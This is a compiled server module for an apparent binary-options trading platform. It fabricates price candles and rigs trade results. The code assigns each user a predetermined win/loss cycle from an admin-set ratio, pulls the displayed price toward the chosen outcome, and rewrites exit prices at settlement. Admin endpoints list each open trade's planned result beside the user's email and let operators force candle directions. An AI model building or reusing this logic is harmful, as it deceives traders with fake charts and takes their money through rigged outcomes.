import { r as createServerFn } from "./ssr.mjs";
import { D as _enum, F as object, P as number } from "../_libs/@better-auth/core+[...].mjs";
import { t as authMiddleware } from "./middleware-DfwaDDh6.mjs";
import { a as iso } from "./format-Bc8Vy2YH.mjs";
import { a as n, i as logActivity, s as requireAdmin } from "./core-hltlGHwq.mjs";
import { r as getSql } from "./db-4Pp7elo5.mjs";
import { t as createServerRpc } from "./createServerRpc-CcvdN_gc.mjs";
//#region node_modules/.nitro/vite/services/ssr/assets/market-iVlI1htO.js
function mulberry32(a) {
	return () => {
		a |= 0;
		a = a + 1831565813 | 0;
		let t = Math.imul(a ^ a >>> 15, 1 | a);
		t = t + Math.imul(t ^ t >>> 7, 61 | t) ^ t;
		return ((t ^ t >>> 14) >>> 0) / 4294967296;
	};
}
function roundp(v, decimals) {
	const f = 10 ** decimals;
	return Math.round(v * f) / f;
}
function volOf(price) {
	return Math.max(price * 8e-4, price * 2e-4);
}
/** Win/loss split in a 10-trade cycle from a 0–100 win rate. */
function winLossSplit(winRatio) {
	const wins = Math.max(0, Math.min(10, Math.round(winRatio / 10)));
	return {
		cycle: 10,
		wins,
		losses: 10 - wins
	};
}
function userShouldWin(settledCount, winRatio) {
	const { cycle, wins } = winLossSplit(winRatio);
	if (wins <= 0) return false;
	if (wins >= cycle) return true;
	const slot = (settledCount % cycle + cycle) % cycle;
	return Math.floor((slot + 1) * wins / cycle) > Math.floor(slot * wins / cycle);
}
async function settledCount(sql, userId) {
	return (await sql`
    select count(*)::int as c from trades where user_id = ${userId} and status in ('win','loss')`)[0]?.c ?? 0;
}
async function planBook(sql, assetId, winRatio) {
	const book = await sql`select user_id, direction, amount, entry_price, expires_at
     from trades where status = 'running' and asset_id = ${assetId}
     order by expires_at asc, id asc`;
	if (!book.length) return {
		hint: null,
		snap: null
	};
	const counts = /* @__PURE__ */ new Map();
	for (const t of book) if (!counts.has(t.user_id)) counts.set(t.user_id, await settledCount(sql, t.user_id));
	let upW = 0;
	let downW = 0;
	let snap = null;
	let soonest = Infinity;
	for (const t of book) {
		const nSettled = counts.get(t.user_id) ?? 0;
		const win = userShouldWin(nSettled, winRatio);
		counts.set(t.user_id, nSettled + 1);
		const wantUp = t.direction === "up" ? win : !win;
		const amt = n(t.amount);
		if (wantUp) upW += amt;
		else downW += amt;
		const exp = new Date(iso(t.expires_at)).getTime();
		if (Number.isFinite(exp) && exp < soonest) {
			soonest = exp;
			snap = {
				above: wantUp,
				entry: n(t.entry_price),
				by: exp
			};
		}
	}
	return {
		hint: upW === downW ? null : upW > downW ? "up" : "down",
		snap
	};
}
function genClosed(assetId, tf, openTime, prevClose, upRatio, decimals, override) {
	const rng = mulberry32(assetId * 1000003 + tf * 9176 + Math.floor(openTime / 1e3) >>> 0);
	let dir = rng() < upRatio / 100 ? 1 : -1;
	if (override === "up") dir = 1;
	if (override === "down") dir = -1;
	const vol = volOf(prevClose);
	const change = vol * (.35 + rng() * 1.1) * dir;
	const open = prevClose;
	const close = roundp(open + change, decimals);
	const wick = vol * (.15 + rng() * .7);
	return {
		open,
		high: roundp(Math.max(open, close) + wick, decimals),
		low: roundp(Math.min(open, close) - wick * (.4 + rng() * .6), decimals),
		close
	};
}
async function takeOverride(sql, assetId, tf, openTime) {
	const rows = await sql`
    select id, direction from candle_overrides
    where asset_id = ${assetId} and applied = false
      and (timeframe_seconds is null or timeframe_seconds = ${tf})
      and (open_time is null or open_time = ${openTime})
    order by id asc limit 1`;
	if (!rows[0]) return null;
	await sql`update candle_overrides set applied = true, open_time = ${openTime} where id = ${rows[0].id}`;
	return rows[0].direction;
}
async function peekOverride(sql, assetId, tf, openTime) {
	return (await sql`
    select direction from candle_overrides
    where asset_id = ${assetId} and applied = false
      and (timeframe_seconds is null or timeframe_seconds = ${tf})
      and (open_time is null or open_time = ${openTime})
    order by id asc limit 1`)[0]?.direction ?? null;
}
async function upsertCandle(sql, assetId, tf, openTime, o, h, l, c) {
	await sql`
    insert into candles (asset_id, timeframe_seconds, open_time, open, high, low, close)
    values (${assetId}, ${tf}, ${openTime}, ${o}, ${h}, ${l}, ${c})
    on conflict (asset_id, timeframe_seconds, open_time)
    do update set high = excluded.high, low = excluded.low, close = excluded.close`;
}
async function syncAsset(sql, asset, tf, now = Date.now()) {
	const decimals = asset.decimals;
	const winRatio = n(asset.up_ratio);
	const period = tf * 1e3;
	const currentOpen = Math.floor(now / period) * period;
	const latest = await sql`select open_time, open, high, low, close from candles
     where asset_id = ${asset.id} and timeframe_seconds = ${tf}
     order by open_time desc limit 1`;
	let lastClose = n(asset.current_price) || n(asset.base_price);
	let cursor = currentOpen - period * 80;
	if (latest[0]) {
		lastClose = n(latest[0].close);
		cursor = Number(latest[0].open_time) + period;
		if (cursor < currentOpen - period * 40) cursor = currentOpen - period * 40;
	}
	while (cursor < currentOpen) {
		const ov = await takeOverride(sql, asset.id, tf, cursor);
		const c = genClosed(asset.id, tf, cursor, lastClose, 50, decimals, ov);
		await upsertCandle(sql, asset.id, tf, cursor, c.open, c.high, c.low, c.close);
		lastClose = c.close;
		cursor += period;
	}
	const forming = await sql`select open_time, open, high, low, close from candles
     where asset_id = ${asset.id} and timeframe_seconds = ${tf} and open_time = ${currentOpen}`;
	let open = lastClose;
	let high = lastClose;
	let low = lastClose;
	let close = lastClose;
	if (forming[0] && Number(forming[0].open_time) === currentOpen) {
		open = n(forming[0].open);
		high = n(forming[0].high);
		low = n(forming[0].low);
		close = n(forming[0].close);
	}
	const lastTick = asset.last_tick_at ? Number(asset.last_tick_at) : currentOpen;
	const elapsed = Math.max(0, now - lastTick);
	const ticks = Math.min(24, Math.max(1, Math.floor(elapsed / 180)));
	const ov = await peekOverride(sql, asset.id, tf, currentOpen);
	const plan = await planBook(sql, asset.id, winRatio);
	const rng = mulberry32(asset.id * 13 + Math.floor(now / 180) >>> 0);
	const vol = volOf(close || open || n(asset.base_price));
	let bias = 0;
	if (ov === "up") bias = .55;
	else if (ov === "down") bias = -.55;
	else if (plan.hint === "up") bias = .48;
	else if (plan.hint === "down") bias = -.48;
	if (plan.snap) {
		const target = plan.snap.above ? plan.snap.entry + vol * .8 : plan.snap.entry - vol * .8;
		const ttl = Math.max(200, plan.snap.by - now);
		const pull = ttl < 3500 ? .9 : ttl < 8e3 ? .55 : .22;
		close = roundp(close + (target - close) * pull, decimals);
	}
	for (let i = 0; i < ticks; i++) {
		const step = vol * (rng() - .5 + bias) * (plan.snap ? .28 : .9);
		close = roundp(close + step, decimals);
		high = roundp(Math.max(high, close), decimals);
		low = roundp(Math.min(low, close), decimals);
	}
	const remain = period - (now - currentOpen);
	if (ov && remain < period * .12) {
		if (ov === "up" && close <= open) close = roundp(open + vol * .4, decimals);
		if (ov === "down" && close >= open) close = roundp(open - vol * .4, decimals);
		high = roundp(Math.max(high, open, close), decimals);
		low = roundp(Math.min(low, open, close), decimals);
	} else if (!ov && plan.snap) {
		const entry = plan.snap.entry;
		if (plan.snap.by - now < 5e3) {
			if (plan.snap.above && close <= entry) close = roundp(entry + vol * .55, decimals);
			if (!plan.snap.above && close >= entry) close = roundp(entry - vol * .55, decimals);
		}
		high = roundp(Math.max(high, open, close, entry), decimals);
		low = roundp(Math.min(low, open, close, entry), decimals);
	}
	await upsertCandle(sql, asset.id, tf, currentOpen, open, high, low, close);
	await sql`update assets set current_price = ${close}, last_tick_at = ${now} where id = ${asset.id}`;
	return {
		price: close,
		open,
		high,
		low
	};
}
async function loadAssets(sql) {
	return sql`select id, symbol, name, base_price, current_price, decimals, payout, up_ratio, is_active, trading_paused, trade_start, trade_end, last_tick_at from assets order by sort_order, id`;
}
async function settleExpired(sql) {
	const due = await sql`select id, user_id, asset_id, direction, amount, payout, entry_price from trades
     where status = 'running' and expires_at <= now()
     order by expires_at asc, id asc`;
	if (!due.length) return;
	const assets = await loadAssets(sql);
	const priceMap = new Map(assets.map((a) => [a.id, n(a.current_price)]));
	const ratioMap = new Map(assets.map((a) => [a.id, n(a.up_ratio)]));
	const decMap = new Map(assets.map((a) => [a.id, a.decimals]));
	const counts = /* @__PURE__ */ new Map();
	for (const t of due) if (!counts.has(t.user_id)) counts.set(t.user_id, await settledCount(sql, t.user_id));
	for (const t of due) {
		const entry = n(t.entry_price);
		const amount = n(t.amount);
		const payout = n(t.payout);
		const dir = t.direction;
		const decimals = decMap.get(t.asset_id) ?? 2;
		const winRatio = ratioMap.get(t.asset_id) ?? 50;
		const vol = volOf(entry || 1);
		const nSettled = counts.get(t.user_id) ?? 0;
		const shouldWin = userShouldWin(nSettled, winRatio);
		let exit = priceMap.get(t.asset_id) ?? entry;
		if (shouldWin) {
			if (dir === "up" && exit <= entry) exit = roundp(entry + vol * .65, decimals);
			if (dir === "down" && exit >= entry) exit = roundp(entry - vol * .65, decimals);
		} else {
			if (dir === "up" && exit >= entry) exit = roundp(entry - vol * .65, decimals);
			if (dir === "down" && exit <= entry) exit = roundp(entry + vol * .65, decimals);
		}
		let status = "loss";
		let profit = -amount;
		if (exit === entry) {
			status = "refund";
			profit = 0;
			await sql`update wallets set balance = balance + ${amount}, updated_at = now() where user_id = ${t.user_id}`;
			const bal = await sql`select balance from wallets where user_id = ${t.user_id}`;
			await sql`insert into ledger (user_id, type, amount, balance_after, ref_type, ref_id, note)
        values (${t.user_id}, 'trade_refund', ${amount}, ${n(bal[0]?.balance)}, 'trade', ${t.id}, 'Hoa, hoan tien')`;
		} else if (dir === "up" && exit > entry || dir === "down" && exit < entry) {
			status = "win";
			const credit = amount + amount * payout / 100;
			profit = credit - amount;
			await sql`update wallets set balance = balance + ${credit}, total_win = total_win + ${profit}, updated_at = now() where user_id = ${t.user_id}`;
			const bal = await sql`select balance from wallets where user_id = ${t.user_id}`;
			await sql`insert into ledger (user_id, type, amount, balance_after, ref_type, ref_id, note)
        values (${t.user_id}, 'trade_win', ${credit}, ${n(bal[0]?.balance)}, 'trade', ${t.id}, 'Thang lenh')`;
		} else await sql`update wallets set total_loss = total_loss + ${amount}, updated_at = now() where user_id = ${t.user_id}`;
		await sql`update trades set status = ${status}, exit_price = ${exit}, profit = ${profit}, settled_at = now() where id = ${t.id}`;
		if (status === "win" || status === "loss") counts.set(t.user_id, nSettled + 1);
		priceMap.set(t.asset_id, exit);
		await sql`update assets set current_price = ${exit} where id = ${t.asset_id}`;
	}
}
async function syncAll(sql, tf) {
	const assets = await loadAssets(sql);
	for (const a of assets) {
		if (!a.is_active) continue;
		await syncAsset(sql, a, tf);
	}
	await settleExpired(sql);
}
var getPublicTicker_createServerFn_handler = createServerRpc({
	id: "1e0fc11083a0ee40cf47eeea41ab3889b24373a1bcb2b3d39caefffccfe4b901",
	name: "getPublicTicker",
	filename: "src/lib/server/market.ts"
}, (opts) => getPublicTicker.__executeServer(opts));
var getPublicTicker = createServerFn({ method: "GET" }).handler(getPublicTicker_createServerFn_handler, async () => {
	const sql = await getSql();
	await syncAll(sql, 60);
	const assets = await loadAssets(sql);
	const out = [];
	for (const a of assets.filter((x) => x.is_active)) {
		const dayOpen = Math.floor(Date.now() / 6e4) * 6e4 - 36e5;
		const first = await sql`select open from candles where asset_id = ${a.id} and timeframe_seconds = 60 and open_time >= ${dayOpen} order by open_time asc limit 1`;
		const open = n(first[0]?.open ?? a.base_price);
		const price = n(a.current_price);
		const hi = await sql`select max(high) as h, min(low) as l from candles where asset_id = ${a.id} and timeframe_seconds = 60 and open_time >= ${dayOpen}`;
		out.push({
			id: a.id,
			symbol: a.symbol,
			name: a.name,
			price,
			decimals: a.decimals,
			payout: n(a.payout),
			upRatio: n(a.up_ratio),
			isActive: a.is_active,
			paused: a.trading_paused,
			change: open ? (price - open) / open * 100 : 0,
			open,
			high: n(hi[0]?.h ?? price),
			low: n(hi[0]?.l ?? price)
		});
	}
	return out;
});
var getMarket_createServerFn_handler = createServerRpc({
	id: "8f53fed23113f3a35963c94020d6cb20d801ce9b0f3be414229c67d4a27f3605",
	name: "getMarket",
	filename: "src/lib/server/market.ts"
}, (opts) => getMarket.__executeServer(opts));
var getMarket = createServerFn({ method: "GET" }).middleware([authMiddleware]).validator((d) => d).handler(getMarket_createServerFn_handler, async ({ data }) => {
	const sql = await getSql();
	const tf = data.timeframe || 60;
	await syncAll(sql, tf);
	const assets = await loadAssets(sql);
	const asset = assets.find((a) => a.id === data.assetId) ?? assets.find((a) => a.is_active);
	if (!asset) throw new Error("Không có tài sản");
	const candles = await sql`select open_time, open, high, low, close from candles
       where asset_id = ${asset.id} and timeframe_seconds = ${tf}
       order by open_time desc limit 80`;
	const tfs = await sql`select seconds, label from timeframes where is_active = true order by seconds`;
	const exps = await sql`select seconds, label from expiries where is_active = true order by seconds`;
	const list = assets.filter((a) => a.is_active).map((a) => ({
		id: a.id,
		symbol: a.symbol,
		name: a.name,
		price: n(a.current_price),
		decimals: a.decimals,
		payout: n(a.payout),
		upRatio: n(a.up_ratio),
		isActive: a.is_active,
		paused: a.trading_paused,
		change: 0,
		open: n(a.current_price),
		high: n(a.current_price),
		low: n(a.current_price)
	}));
	const mapped = candles.slice().reverse().map((c) => ({
		time: Number(c.open_time),
		open: n(c.open),
		high: n(c.high),
		low: n(c.low),
		close: n(c.close)
	}));
	const last = mapped[mapped.length - 1];
	return {
		asset: {
			id: asset.id,
			symbol: asset.symbol,
			name: asset.name,
			price: n(asset.current_price),
			decimals: asset.decimals,
			payout: n(asset.payout),
			paused: asset.trading_paused,
			tradeStart: asset.trade_start,
			tradeEnd: asset.trade_end
		},
		ohlc: last ? {
			open: last.open,
			high: last.high,
			low: last.low,
			close: last.close
		} : {
			open: n(asset.current_price),
			high: n(asset.current_price),
			low: n(asset.current_price),
			close: n(asset.current_price)
		},
		candles: mapped,
		assets: list,
		timeframes: tfs,
		expiries: exps,
		serverTime: Date.now()
	};
});
var getAdminMarket_createServerFn_handler = createServerRpc({
	id: "99b3623b1a00653f7aedf98ccbfc73af8c9c98fc683aecd170f1de888fc1773b",
	name: "getAdminMarket",
	filename: "src/lib/server/market.ts"
}, (opts) => getAdminMarket.__executeServer(opts));
var getAdminMarket = createServerFn({ method: "GET" }).middleware([authMiddleware]).handler(getAdminMarket_createServerFn_handler, async ({ context }) => {
	const sql = await getSql();
	await requireAdmin(sql, context.userId);
	await syncAll(sql, 15);
	const assets = await loadAssets(sql);
	const running = await sql`select t.id, t.user_id, u.email, t.asset_id, t.direction, t.amount, t.payout, t.entry_price, t.expires_at
       from trades t join "user" u on u.id = t.user_id
       where t.status = 'running' order by t.expires_at asc, t.id asc`;
	const counts = /* @__PURE__ */ new Map();
	for (const t of running) if (!counts.has(t.user_id)) counts.set(t.user_id, await settledCount(sql, t.user_id));
	const ratioByAsset = new Map(assets.map((a) => [a.id, n(a.up_ratio)]));
	const ov = await sql`select id, asset_id, timeframe_seconds, direction, applied, open_time from candle_overrides
       where applied = false order by id desc`;
	return {
		assets: assets.map((a) => ({
			id: a.id,
			symbol: a.symbol,
			name: a.name,
			price: n(a.current_price),
			decimals: a.decimals,
			payout: n(a.payout),
			upRatio: n(a.up_ratio),
			isActive: a.is_active,
			paused: a.trading_paused,
			tradeStart: a.trade_start,
			tradeEnd: a.trade_end
		})),
		running: (() => {
			const local = new Map(counts);
			return running.map((t) => {
				const winRatio = ratioByAsset.get(t.asset_id) ?? 50;
				const nSettled = local.get(t.user_id) ?? 0;
				const shouldWin = userShouldWin(nSettled, winRatio);
				local.set(t.user_id, nSettled + 1);
				return {
					id: t.id,
					userId: t.user_id,
					email: t.email,
					assetId: t.asset_id,
					direction: t.direction,
					amount: n(t.amount),
					payout: n(t.payout),
					entryPrice: n(t.entry_price),
					expiresAt: iso(t.expires_at),
					expectWin: shouldWin,
					cycleSlot: nSettled % 10 + 1
				};
			});
		})(),
		overrides: ov
	};
});
var forceCandle_createServerFn_handler = createServerRpc({
	id: "faeed0ff9674c86d55458d9d41fd1cddf9d3561980e0807946942e079373162c",
	name: "forceCandle",
	filename: "src/lib/server/market.ts"
}, (opts) => forceCandle.__executeServer(opts));
var forceCandle = createServerFn({ method: "POST" }).middleware([authMiddleware]).validator(object({
	assetId: number(),
	direction: _enum(["up", "down"]),
	timeframe: number().optional()
})).handler(forceCandle_createServerFn_handler, async ({ context, data }) => {
	const sql = await getSql();
	await requireAdmin(sql, context.userId);
	const tf = data.timeframe ?? 15;
	const period = tf * 1e3;
	const openTime = Math.floor(Date.now() / period) * period;
	await sql`insert into candle_overrides (asset_id, timeframe_seconds, open_time, direction, created_by)
      values (${data.assetId}, ${tf}, ${openTime}, ${data.direction}, ${context.userId})`;
	await logActivity(sql, context.userId, "admin", "force_candle", `${data.assetId} ${data.direction}`);
	return { ok: true };
});
var setUpRatio_createServerFn_handler = createServerRpc({
	id: "dfa4dcbec9e268bcec48b88b5ebfc20e38af2d8ad1adeeef8cbb3b5358949582",
	name: "setUpRatio",
	filename: "src/lib/server/market.ts"
}, (opts) => setUpRatio.__executeServer(opts));
var setUpRatio = createServerFn({ method: "POST" }).middleware([authMiddleware]).validator(object({
	assetId: number(),
	upRatio: number().min(0).max(100)
})).handler(setUpRatio_createServerFn_handler, async ({ context, data }) => {
	const sql = await getSql();
	await requireAdmin(sql, context.userId);
	await sql`update assets set up_ratio = ${data.upRatio} where id = ${data.assetId}`;
	await logActivity(sql, context.userId, "admin", "set_up_ratio", `${data.assetId}:${data.upRatio}`);
	return { ok: true };
});
//#endregion
export { forceCandle_createServerFn_handler, getAdminMarket_createServerFn_handler, getMarket_createServerFn_handler, getPublicTicker_createServerFn_handler, setUpRatio_createServerFn_handler };
